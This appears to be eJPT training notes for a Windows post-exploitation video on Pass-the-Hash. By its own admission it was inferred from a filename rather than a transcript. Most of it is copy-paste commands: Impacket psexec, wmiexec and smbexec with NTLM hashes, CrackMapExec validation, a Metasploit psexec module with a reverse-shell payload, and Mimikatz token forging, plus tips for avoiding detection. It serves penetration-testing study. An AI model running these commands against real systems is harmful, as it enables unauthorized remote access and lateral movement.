# 11 - Pass-the-Hash With PSExec (eJPT) — Windows Post-Exploitation

Note: No transcript was provided. The following summary is inferred conservatively from the filename and module context (04-WindowsPostExploitation). Commands and flows reflect common eJPT lab practice for performing Pass-the-Hash (PtH) with PSExec-style techniques against SMB-enabled Windows hosts. Use only in authorized lab environments.

## What the video covers (Introduction / big picture)
- The Pass-the-Hash (PtH) technique to authenticate to Windows systems using an NTLM hash instead of a cleartext password.
- Using PSExec-style remote service creation to achieve command execution on a target over SMB (TCP/445).
- Typical workflow: verify SMB exposure, validate the hash works, and leverage Impacket’s psexec.py (and/or alternatives) to obtain an elevated shell.
- Differences and quick alternatives: wmiexec.py and smbexec.py (Impacket), CrackMapExec for validation, and Metasploit’s psexec module.
- Requirements and gotchas: local admin rights, ADMIN$ share accessible, UAC remote restrictions, and domain vs local accounts.

## Flow (ordered)
1. Identify a target with SMB (port 445) exposed.
2. Obtain a valid NTLM (NT) hash for a user with local admin rights on the target.
3. Validate the hash works against SMB.
4. Execute a remote shell using Impacket’s psexec.py (PSExec-like service method).
5. Enumerate the system and pivot as needed.
6. Use alternatives if PSExec is blocked (wmiexec.py/smbexec.py or Metasploit).
7. Clean up artifacts (temporary service/files) if needed.

## Tools highlighted
- Impacket (psexec.py, wmiexec.py, smbexec.py)
- CrackMapExec (CME)
- Nmap (SMB discovery)
- Metasploit Framework (exploit/windows/smb/psexec) — optional
- Sysinternals PsExec (Windows) — note: does not natively accept hashes; often paired with Mimikatz “sekurlsa::pth” if demonstrated from Windows

## Typical command walkthrough (detailed, copy-paste friendly)

Set up handy variables (adjust to your lab):
```bash
export TARGET="10.10.10.20"
export USER="Administrator"         # Or domain user with admin rights on TARGET
export DOMAIN="."                   # Use '.' for local, or e.g. "LAB"
export NTHASH="8846f7eaee8fb117ad06bdd830b7586c"
export LMHASH="aad3b435b51404eeaad3b435b51404ee"   # Common placeholder for empty LM
export DC_IP="10.10.10.10"          # Only if using domain auth and Impacket needs a DC
```

1) Confirm SMB exposure
```bash
nmap -sC -sV -p 135,139,445,3389 -Pn $TARGET
```

2) Validate the hash with CrackMapExec (should show SUCCESS or Pwn3d!)
```bash
crackmapexec smb $TARGET -u "$USER" -H "$NTHASH"
# Optional: enumerate shares to confirm ADMIN$ is accessible
crackmapexec smb $TARGET -u "$USER" -H "$NTHASH" --shares
# Optional: execute a quick command to confirm code execution
crackmapexec smb $TARGET -u "$USER" -H "$NTHASH" -x "whoami"
```

3) PSExec-style shell with Impacket (preferred for interactive cmd)
- Using both LM and NT hash:
```bash
impacket-psexec -hashes "$LMHASH:$NTHASH" "$USER@$TARGET"
```
- If in a domain and name resolution is finicky:
```bash
impacket-psexec -hashes "$LMHASH:$NTHASH" "$DOMAIN/$USER@$TARGET" -dc-ip "$DC_IP"
```
- If your system exposes psexec.py directly:
```bash
psexec.py -hashes "$LMHASH:$NTHASH" "$USER@$TARGET"
# or
python3 -m impacket.examples.psexec -hashes "$LMHASH:$NTHASH" "$USER@$TARGET"
```

4) Alternative execution methods (when PSExec is blocked/detected)
- WMI-based (often quieter than psexec), executes commands and returns output:
```bash
impacket-wmiexec -hashes ":$NTHASH" "$USER@$TARGET"
# Domain example
impacket-wmiexec -hashes "$LMHASH:$NTHASH" "$DOMAIN/$USER@$TARGET" -dc-ip "$DC_IP"
```
- SMBExec (drops a service and runs commands, semi-interactive):
```bash
impacket-smbexec -hashes ":$NTHASH" "$USER@$TARGET"
```

5) Post-exploitation enumeration (inside the shell)
```cmd
whoami /all
hostname
ipconfig /all
net user
net localgroup administrators
net group "Domain Admins" /domain
systeminfo
dir C:\Users
```

6) Optional: Metasploit psexec (hash in SMBPass as LM:NT)
```text
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.20
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
set SMBDomain .
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

7) Optional: From a Windows jump host with Mimikatz + Sysinternals PsExec
- Create a process with a forged logon using the NT hash, then run PsExec from it:
```text
mimikatz # sekurlsa::pth /user:Administrator /domain:LAB /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe
# In the spawned PowerShell with the forged token:
.\PsExec64.exe \\10.10.10.20 cmd
```
Note: Sysinternals PsExec itself does not accept hashes; the “pass-the-hash” occurs via the forged logon token created by Mimikatz.

8) Cleanup (if artifacts remain)
- Impacket usually cleans up its temporary service and files automatically. If not:
```cmd
sc query state= all | findstr /i "psexec remcom"
sc stop <ServiceName>
sc delete <ServiceName>
del C:\Windows\Temp\<dropped_binary>.exe
```

## Practical tips
- You must have local administrator rights on the target for PSExec-style methods (service creation requires admin).
- The NT hash is required for true PtH. A captured NetNTLMv2 challenge/response is not directly usable for PtH until cracked to a password (or you relay it in a different attack).
- Remote UAC restrictions: local admin accounts connecting over the network may be filtered on modern Windows. Built-in Administrator or domain admin avoids this; otherwise set LocalAccountTokenFilterPolicy in lab scenarios.
- If psexec.py feels unstable or is detected, try wmiexec.py (quieter) or smbexec.py.
- Ensure ADMIN$ share is reachable; if it’s disabled, psexec-style methods will fail.
- When in a domain, add -dc-ip to Impacket commands if name resolution is unreliable.
- Keep Impacket and CME updated; SMB dialect negotiation issues are common on older versions.
- Expect AV/EDR to flag PSExec methods in real environments; this is lab-only behavior.

## Minimal cheat sheet (one-screen flow)
```bash
# Vars
export TARGET="10.10.10.20"
export USER="Administrator"
export DOMAIN="."
export NTHASH="8846f7eaee8fb117ad06bdd830b7586c"
export LMHASH="aad3b435b51404eeaad3b435b51404ee"

# 1) Confirm SMB
nmap -sC -sV -p 135,139,445 -Pn $TARGET

# 2) Validate hash works
crackmapexec smb $TARGET -u "$USER" -H "$NTHASH"
crackmapexec smb $TARGET -u "$USER" -H "$NTHASH" -x "whoami"

# 3) Shell via PSExec-style
impacket-psexec -hashes "$LMHASH:$NTHASH" "$USER@$TARGET"
# or domain
impacket-psexec -hashes "$LMHASH:$NTHASH" "$DOMAIN/$USER@$TARGET" -dc-ip "$DC_IP"

# 4) Alternatives
impacket-wmiexec -hashes ":$NTHASH" "$USER@$TARGET"
impacket-smbexec -hashes ":$NTHASH" "$USER@$TARGET"

# 5) Inside shell
whoami /all && hostname && ipconfig /all
```

## Summary
This video demonstrates Pass-the-Hash against Windows over SMB using a PSExec-style technique to obtain remote command execution. After confirming SMB exposure and validating a working NT hash with CrackMapExec, Impacket’s psexec.py is used to create a service on the target and spawn an interactive cmd shell. Alternatives like wmiexec.py and smbexec.py can be used when PSExec is blocked or too noisy. Key requirements include administrator privileges on the target, access to ADMIN$, and correct handling of domain vs local accounts.